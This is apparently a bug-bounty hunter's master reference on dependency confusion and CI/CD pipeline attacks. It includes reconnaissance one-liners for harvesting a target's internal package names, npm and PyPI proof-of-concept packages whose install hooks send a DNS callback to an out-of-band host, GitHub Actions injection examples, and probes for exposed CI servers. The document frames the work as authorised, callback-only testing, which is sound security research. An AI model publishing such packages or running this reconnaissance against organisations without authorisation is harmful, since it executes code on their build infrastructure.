# SUPPLY CHAIN / DEPENDENCY CONFUSION — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 25), telegram-intel, github-x-intel (H1 reports), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Harvest internal package names (GitHub, JS bundles, CI configs, error messages)
[ ] 2. Confirm unclaimed on public registry (npm, PyPI, Maven, RubyGems, NuGet, Go)
[ ] 3. Verify private registry exists (.npmrc, CI configs, Dockerfiles)
[ ] 4. Publish benign callback package (DNS/HTTP → Collaborator/interactsh)
[ ] 5. Wait for callback from target infrastructure (ARIN-verified IP)
[ ] 6. Unpublish immediately → report with ARIN proof
```

---

## CORE CONCEPT

> **The entire bug is: "Can your code execute on their infra RIGHT NOW?"**
>
> A DNS/HTTP callback from their network = proof. No callback = no bug.
>
> **Ethical line:** Callback ONLY, never real payload. Unpublish immediately after callback.

---

## ROOT CAUSE

The package-manager resolver prefers **highest version across ALL configured registries** instead of pinning name→registry origin.

```
# VULNERABLE — internal pkg "acme-auth-utils" lives only on private registry
# Resolver also checks public npm → attacker publishes acme-auth-utils@99.0.0
# Resolver sees 99.0.0 > internal 1.4.2 → installs attacker's
npm install            # no scope, no lockfile pin, registry fallback enabled

# SECURE — scoped name bound to registry
@acme/auth-utils  +  .npmrc: @acme:registry=https://npm.internal.acme.com
# pip: --require-hashes
# Maven: <checksumPolicy>fail</checksumPolicy>
# Go: committed go.sum + -mod=readonly
```

---

## DETECTION — STEP 1: HARVEST INTERNAL PACKAGE NAMES

### 1. Leaked package.json / lockfiles in public GitHub repos
```bash
# GitHub code search (web or gh CLI)
gh api "search/code?q=org:TARGET+filename:package.json+acme-" --jq '.items[].html_url'
gh api "search/code?q=org:TARGET+filename:package-lock.json+acme" --jq '.items[].html_url'
gh api "search/code?q=org:TARGET+filename:yarn.lock+@acme" --jq '.items[].html_url'
gh api "search/code?q=org:TARGET+filename:requirements.txt+acme" --jq '.items[].html_url'
gh api "search/code?q=org:TARGET+filename:Gemfile+acme" --jq '.items[].html_url'
gh api "search/code?q=org:TARGET+filename:pom.xml+acme" --jq '.items[].html_url'

# Search for scoped imports
gh api "search/code?q=org:TARGET+@acme+" --jq '.items[].html_url'
```

### 2. JS bundles on org's own sites (most reliable source)
```bash
# Recon already has these — extract from JS bundles
grep -rhoE "require\(['\"][@a-z0-9._/-]+['\"]\)" recon/$TARGET/js/ | sort -u
grep -rhoE "from ['\"]@[a-z0-9-]+/[a-z0-9._-]+['\"]" recon/$TARGET/js/ | sort -u

# Webpack/Vite source maps
grep -rhoE '"[@a-z0-9._/-]+"' recon/$TARGET/js/*.map 2>/dev/null | grep -iE "$ORGKEYWORD" | sort -u
```

### 3. Config files referencing internal registry
```bash
# .npmrc, .pip.conf, .gemrc, settings.xml, pip.conf, poetry.lock, Cargo.toml
grep -rniE "registry=|index-url|@[a-z]+:registry|nexus|artifactory|verdaccio|packagecloud" recon/$TARGET/
grep -rniE "registry\.npm|private\.npm|internal\.npm|verdaccio|artifactory" recon/$TARGET/
```

### 4. Error messages / 404s
```bash
# Stack traces naming internal modules
# "Cannot find module 'acme-internal-sdk'"
# "No matching distribution found for acme-..."
```

### 5. Other leak spots
```bash
# Dockerfile / docker-compose
grep -r "COPY .npmrc\|RUN npm i.*acme-" recon/$TARGET/

# CI configs
grep -r "npm i.*acme-\|pip install.*acme-" recon/$TARGET/.github/workflows/
grep -r "acme-" recon/$TARGET/.gitlab-ci.yml

# Postman/Swagger/SDK docs
grep -r "npm install @acme/" recon/$TARGET/

# Source maps
grep -rhoE '"[@a-z0-9._/-]+"' recon/$TARGET/js/*.map 2>/dev/null | grep -iE "$ORGKEYWORD" | sort -u
```

---

## DETECTION — STEP 2: CONFIRM UNCLAIMED ON PUBLIC REGISTRY

```bash
# npm
npm view acme-internal-sdk 2>&1 | grep -q "404" && echo "UNCLAIMED"

# PyPI
pip index versions acme-internal-sdk 2>&1 | grep -q "not found" && echo "UNCLAIMED"

# Maven Central
curl -s "https://search.maven.org/solrsearch/select?q=g:acme-internal-sdk&rows=1" | grep -q '"numFound":0' && echo "UNCLAIMED"

# RubyGems
gem list -r acme-internal-sdk 2>&1 | grep -q "not found" && echo "UNCLAIMED"

# NuGet
curl -s "https://api.nuget.org/v3/registration5-gz-semver2/acme-internal-sdk/index.json" | grep -q "404" && echo "UNCLAIMED"

# Go
go list -m acme-internal-sdk@latest 2>&1 | grep -q "not found" && echo "UNCLAIMED"

# Generic: check if name exists on public registry
# If exists → N/A (either org owns it or someone else does)
```

---

## SCOPED-NAME NUANCE (npm)

> `@acme/auth-utils` is NOT confusable **unless the scope `@acme` is UNREGISTERED** on public npm — then attacker can register the scope and publish under it.

```bash
# Check if scope exists
npm view @acme 2>&1 | grep -q "404" && echo "SCOPE UNCLAIMED — VULNERABLE"
```

**Unscoped names** (`acme-auth-utils`) are the classic, easier case.

---

## EXPLOITATION — CALLBACK-ONLY PoC

### 1. Create Benign Callback Package

```bash
# npm
mkdir acme-internal-sdk && cd acme-internal-sdk
cat > package.json << 'EOF'
{
  "name": "acme-internal-sdk",
  "version": "99.0.0",
  "description": "Internal SDK for Acme Corp",
  "scripts": {
    "install": "node -e \"require('dns').lookup('CALLBACK_ID.oast.fun',()=>{})\""
  }
}
EOF
npm publish --access public
npm unpublish acme-internal-sdk@99.0.0  # IMMEDIATELY after callback
```

```python
# PyPI (setup.py runs on install)
# setup.py
from setuptools import setup
import socket
setup(name='acme-internal-sdk', version='99.0.0',
      cmdclass={'install': lambda self: __import__('socket').gethostbyname('CALLBACK_ID.oast.fun')})
```

```xml
<!-- Maven (no install hook — confusion = build pulls poisoned artifact) -->
<!-- Check pom.xml groupId/artifactId, settings.xml for Nexus/Artifactory repo -->
```

### 2. Callback Verification
```bash
# When callback lands:
# 1. ARIN/whois the source IP → does it belong to the org / their cloud account?
# 2. Hostname pattern matches their naming? (CI runner, dev box pattern)
# 3. CWD looks like a CI runner / dev box?

# If YES → GENUINE HIT → UNPUBLISH IMMEDIATELY → REPORT
npm unpublish acme-internal-sdk@99.0.0
```

### 3. Callback Infrastructure
```bash
# Use interactsh / Burp Collaborator / oast.fun / dnsbin
# Format: UNIQUE_ID.oast.fun
# Track which target the callback came from
```

---

## SCOPE CAVEATS — WHAT'S SUBMITTABLE vs N/A

```
Confirmed callback FROM target infra (ARIN-verified)          = High/Critical (RCE-class) — submit
Internal name unclaimed + private registry confirmed,         = Low/Info, often N/A — "speculative, no
  but NO callback / can't prove their build pulls public         proof of execution" closes it
Internal name already on public npm/PyPI (org or 3rd-party)   = N/A (not exploitable by you)
Org pins all deps to scope/lockfile-with-integrity/hashes     = N/A (resolver can't be confused)
Internal package NEVER published publicly + program says      = N/A (Facebook-style rejection: not in scope)
  that's required
Typosquat (similar name, not exact internal name)             = usually N/A on BBPs — low signal, treat as separate
```

> **Per-program reality:** Netflix marks shared-root-cause dep-confusion reports as Duplicate but accepts clear evidence of execution from infra. Facebook rejected a report where the internal package was never on npmjs.com. **Always read the program's supply-chain policy before publishing anything** — and never publish a package the program hasn't put package registries in scope for.

---

## VARIANTS BY ECOSYSTEM

| Ecosystem | Execution Hook | Where Names Leak | Confirm Unclaimed |
|---|---|---|---|
| **npm / yarn / pnpm** | `preinstall`/`postinstall` script | `package.json`, lockfiles, JS bundle `require()`, `.npmrc` | `npm view <name>` → E404 |
| **pip / PyPI** | `setup.py` runs on install (`cmdclass`/`install`) | `requirements.txt`, `setup.py`, `pyproject.toml`, `.pip/pip.conf` `index-url` | `pip index versions <name>` |
| **Maven / Gradle** | no install hook — confusion = build pulls poisoned artifact | `pom.xml` groupId/artifactId, `settings.xml` (Nexus/Artifactory repo) | Maven Central path 404 |
| **RubyGems** | `extconf.rb` / gemspec native-ext build step | `Gemfile`, `*.gemspec`, `.gemrc` source list | `gem list -r <name>` empty |
| **NuGet / Go** | NuGet: install scripts; Go: build-time only | `*.csproj`, `nuget.config`; `go.mod` (less exploitable — proxy + go.sum) | registry lookup 404 |

---

## CI/CD PIPELINE ATTACKS (Supply Chain)

### GitHub Actions
```bash
# Find workflow files
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Dangerous patterns
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint
sisakulint scan .github/workflows/
```

### Code Injection (CICD-SEC-04)
```yaml
# Untrusted input in run: blocks via ${{ }} expressions
run: echo "${{ github.event.issue.title }}"  # INJECTION!
run: npm install ${{ github.event.pull_request.head.ref }}  # INJECTION!
```

**Taint Sources (attacker-controlled):**
- `github.event.issue.title/body`
- `github.event.pull_request.title/body/head.ref`
- `github.event.comment.body`
- `github.event.commits[*].message`
- `github.event.head_commit.message`
- Branch/tag names

### Self-Hosted Runner Exploitation
```bash
# Check for self-hosted runners
grep -r "self-hosted" .github/workflows/

# If found → test for persistence, lateral movement
# Runner has access to org secrets, network
```

### Artifact / Cache Poisoning
```bash
# Check if artifacts from untrusted workflows used in trusted ones
grep -r "actions/download-artifact" .github/workflows/
grep -r "actions/cache" .github/workflows/
```

### Exposed CI/CD (H1 Reports)
```bash
# Jenkins
curl -s "https://jenkins.target.com/api/json" | jq '.jobs[].name'
curl -s "https://jenkins.target.com/script"  # Script console

# CircleCI
curl -s "https://circleci.com/api/v1.1/project/gh/TARGET/REPO" | jq '.[0].build_num'

# GitLab CI
curl -s "https://gitlab.target.com/api/v4/projects" | jq '.[].ci_config_path'
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|---|---|---|---|
| **$130,000+** | Alex Birsan's 2021 research | 35 companies | Dependency confusion |
| **$5,000** | RCE via dependency confusion | Multiple | Callback proving execution |
| **$2,500** | RCE via unclaimed Node package | Multiple | Build pulls poisoned artifact |
| **$4,323** | CVE-2025-24813: RCE/Info Disclosure | IBB | Deserialization/RCE |
| **—** | GitHub repo hijacking (retired usernames) | Multiple | Supply chain |
| **—** | CI/CD logs secret exposure | Multiple | Supply chain |

---

## CHAINS THAT PAY

```
Leaked package.json on GitHub -> unclaimed name -> callback PoC fires from CI    Critical (RCE on build infra)
JS bundle require('internal') -> unclaimed -> callback from dev laptop           High/Critical
.npmrc internal-registry ref -> confirms fallback config -> confusion confirmed  supports the chain
Callback proves exec -> (DO NOT escalate to real RCE) -> report exec proof only  Critical, stays ethical
Internal name found but already public / fully pinned                             N/A — kill it, move on
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Harvest package names from GitHub
gh api "search/code?q=org:TARGET+filename:package.json" --jq '.items[].html_url' | xargs -I{} gh api {} --jq '.content' | base64 -d | jq -r '.dependencies[]?,.devDependencies[]?' | cut -d: -f1 | sort -u

# Extract from JS bundles
grep -rhoE "require\(['\"][@a-z0-9._/-]+['\"]\)" recon/$TARGET/js/ | sed -E "s/require\(['\"]([^'\"]+)['\"]\)/\1/" | sort -u

# Check unclaimed on npm
for pkg in $(cat packages.txt); do npm view $pkg 2>&1 | grep -q "404" && echo "UNCLAIMED: $pkg"; done

# PyPI
for pkg in $(cat packages.txt); do pip index versions $pkg 2>&1 | grep -q "not found" && echo "UNCLAIMED: $pkg"; done

# Maven
for pkg in $(cat packages.txt); do curl -s "https://search.maven.org/solrsearch/select?q=g:$pkg&rows=1" | grep -q '"numFound":0' && echo "UNCLAIMED: $pkg"; done

# GitHub Actions dangerous patterns
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/

# sisakulint
sisakulint scan .github/workflows/

# Exposed CI/CD
for sub in jenkins ci build buildkite travis drone; do
  curl -s -o /dev/null -w "$sub: %{http_code}\n" "https://$sub.target.com/"
done
```

---

## TRIAGE DECISION TREE

```
1. Found internal package name?
   NO → Not supply chain
   YES → Continue

2. Is name UNCLAIMED on public registry?
   NO (claimed) → N/A
   YES → Continue

3. Does org have private registry with fallback?
   NO → Low/Info (speculative)
   YES → Continue

4. Callback from target infra (ARIN-verified)?
   NO → Low/Info (wait for callback)
   YES → Critical — SUBMIT

5. Callback only from registry scanner?
   → N/A (false positive)
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Name already claimed on public registry | N/A |
| Org pins all deps (scope + lockfile + hashes) | Not confusable = N/A |
| No private registry fallback proven | Speculative = N/A |
| Callback only from registry scanner IP | N/A (false positive) |
| No callback after 30 days | Premature = N/A |
| Real payload used (not benign callback) | STOP — legal/ethical breach |
| Typosquat (similar, not exact name) | Usually N/A |
| Internal package never on public + program says not in scope | N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `npm view` / `pip index versions` / `gem list -r` | Check unclaimed |
| `gh api` / `gh search` | GitHub code search |
| `sisakulint` | GitHub Actions security audit |
| `gitleaks` / `trufflehog` | Secret scanning in repos |
| `interactsh` / `Burp Collaborator` / `oast.fun` | Callback infrastructure |
| `gh api search/code` | GitHub code search for package names |
| `jq` | JSON parsing for package extraction |
| `grep` / `rg` | Local recon on JS bundles, configs |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 25 (comprehensive: root cause, detection, exploitation, scope caveats, CI/CD)
- telegram-intel: @bugbountyresources 100 vuln categories
- github-x-intel: H1 reports (supply chain patterns); bountyforge CI/CD attacks
- bountyforge: Supply chain attacks (npm/Gem/PyPI), CI/CD (GitHub Actions expression injection, untrusted checkout, artifact/cache poisoning, self-hosted runner exploitation)
- bb-methodology: What-If experiments (supply chain), Tactical Thinking
- Alex Birsan: "Dependency Confusion" (2021) — $130k+ across 35 companies
- Microsoft Security: 33 malicious npm packages (May 2026)
- snyk: "Dependency Confusion" research
- Snyk: "Software Supply Chain Security" report
- OWASP: Software Supply Chain Security
- SLSA: Supply Chain Levels for Software Artifacts